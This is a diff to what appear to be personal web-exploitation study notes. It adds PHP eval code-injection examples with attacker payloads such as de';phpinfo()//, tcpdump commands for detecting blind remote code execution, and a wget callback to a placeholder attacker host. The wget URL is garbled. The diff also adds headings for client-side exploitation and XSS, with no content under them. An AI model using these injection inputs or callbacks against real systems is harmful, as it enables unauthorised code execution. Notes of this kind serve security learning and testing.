@@ -1,6 +1,45 @@
 <!-- # exploiting_web_application -->
-# Cross site scripting (XSS)
+# Server side EXploitation
+## REmote code execution
+  * Example of Code Evaluation Exploitation
+  You want to have dynamically generated variable names for every user and store its registration date. This is how it could be done in PHP:
+  
+          eval("\$$user = '$regdate');
+    
+  attacker
+  
+          x = 'y';phpinfo();//
+          
+ * Stored Remote Code Evaluation Explanation and Example
+ An expected input could be like this:
 
+             ?language=de
+        
+attacker
+   
+             de';phpinfo()//
+
+### Testing blind RCE
+ #### 1. use tcpdump to capture ICMP requests
+ 
+        tcpdump -i eth0 icmp
+      Example output
+      
+              16:17:46.354621 IP 10.79.97.62 > 216.58.200.14: ICMP echo request, id 33817, seq 1707, length 64
+              16:17:46.399959 IP 216.58.200.14 > 10.79.97.62: ICMP echo reply, id 33817, seq 1707, length 64
+  * With the following command, we can filter ICMP echo-reply, 
+        
+        tcpdump -i eth0 "icmp[0] == 0"  
+  * To filter ICMP echo-requests, we can use this tcpdump command.
+
+        tcpdump -i eth0 "icmp[0] == 8"
+#### 2. Run python server and capture hit request
+   then 
+   
+         wget http://atckerip:python2:serverport/file_in_attacker machine
+      
+# Client side Exploitation
+## Cross site scripting (XSS)
 ## XSS(Reflected)
 ### Basic XSS
 
